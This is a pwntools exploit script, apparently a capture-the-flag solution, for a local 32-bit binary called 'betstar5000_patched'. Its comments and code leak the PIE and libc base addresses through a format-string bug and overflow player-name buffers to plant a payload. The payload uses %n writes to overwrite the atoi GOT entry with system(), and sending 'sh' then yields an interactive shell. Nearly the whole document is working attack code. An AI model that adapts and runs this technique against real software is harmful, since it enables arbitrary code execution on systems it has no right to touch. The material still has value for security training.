from pwn import *

p = process(["./betstar5000_patched"])

elf = ELF("./betstar5000_patched",checksec=False)
libc = ELF("./libc-2.27.so",checksec=False)

# context.log_level = 'debug'

## PIE enabled and stripped
## br *0x56555b17 -> main
## br *0x56555a25 -> menu
## br *0x56555831 -> play
## br *0x565559df -> printf(vuln)

## To leak pie and libc base
## %x.%x
## 1st >>> hex(0x5655605c - 0x56555000) 
## offset for pie -> '0x105c'
## 2nd >>> hex(0xf7fca5c0 - 0xf7df2000)
## offset for libc -> '0x1d85c0'
## vmmap -> 0x56555000 (1st line)
## vmmap -> 0xf7df2000 (line after [heap])

## name -> store max 8 bytes but with edit we can write upto 16 bytes + 1 null bytes overflow to next name
## edit 2nd name so there is no null bytes, so we can write up to 32 bytes now
## name index start with 0
## After overflow now our current stored name
## name[0] -> store 32 bytes
## name[1] -> store 16 bytes

## To make format string trigger we need to make name[0] won
## to make it always won set bet to 1
## The rest name set bet to 99
## snippet -> val1 = (randomness % 100 + 1) - bet
## lower value bet -> higher val1 = high percentage to win

## Craft format string payload
## Base posititon 19
## p/d (first stack - our input stack) / 4
## overwrite atoi GOT into system() from libc

## atoi@got -> 0x56557584 - 0x56555000 
## offset -> 0x2584

p.sendline(b"1")
p.sendline(b"%x.%x")

p.sendline(b"1")
p.sendline(b"1")
p.sendline(b"1")
p.recvuntil(b"*drumroll*: ")
leaks = p.recvuntil(b"\n",drop=True).split(b".")

pieLeak = int(leaks[0],16)
libcLeak = int(leaks[1],16)

elf.address = pieLeak - 0x105c
libc.address = libcLeak - 0x1d85c0

log.success("Leak Pie Base: " + hex(elf.address))
log.success("Leak Libc Base: " + hex(libc.address))

atoi_got = elf.got['atoi']
libc_system = libc.symbols['system']

## Magic to calc address as input to format string

x = (libc_system & 0xffff) - 8 # already append on our payload
y = ((libc_system & 0xffff0000) >> 16) - (libc_system & 0xffff)

payload = p32(atoi_got)
payload += p32(atoi_got+2)
payload += '%{}x'.format(str(x)).encode()
payload += b'%19$n'
payload += '%{}x'.format(str(y)).encode()
payload += b'%20$n'

for i in range(2):
    p.sendline(b'3')
    p.sendline(b'A'*8)

## Edit player name to become payload

p.sendline(b'4')
p.sendline(b'1')
p.sendline(payload[:16])

p.sendline(b'4')
p.sendline(b'2')
p.sendline(payload[16:])

# Play round, then to trigger format string to overwrite atoi GOT

p.sendline(b'1') # Play
p.sendline(b'3') # 3 player

p.sendline(b'100') # format string
p.sendline(b'1') # full payload
p.sendline(b'100') # rest payload

# Send 'sh' to play, since atoi -> system. Now become system('sh')

p.sendline(b'1') # Play
p.sendline(b'sh') # args to system maks 4 bytes because int (atoi input)

# gdb.attach(p,gdbscript="""init-gef
# pie b 0x9df""")

p.interactive()